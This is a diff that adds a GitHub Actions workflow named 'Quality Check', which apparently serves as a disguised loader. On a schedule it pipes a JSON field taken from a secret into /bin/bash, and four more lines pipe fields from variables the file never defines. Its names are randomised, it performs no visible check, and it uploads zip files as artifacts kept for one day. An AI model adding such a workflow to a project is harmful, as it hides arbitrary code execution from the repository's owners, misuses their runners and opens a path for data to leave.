@@ -1,0 +1,35 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          sxon470: ${{ secrets.sxon470 }}
+        run: |
+          printf '%s' "$sxon470" | jq -r .t57230 | /bin/bash
+          printf '%s' "$bli296" | jq -r .fy268 | /bin/bash
+          echo $ypaq6685 | jq -r .w5 | /bin/bash
+          echo $m462 | jq -r .jyu316 | /bin/bash
+          echo $v7 | jq -r .wmtq006 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: TuVjILPk
+          path: "*.zip"
+          retention-days: 1
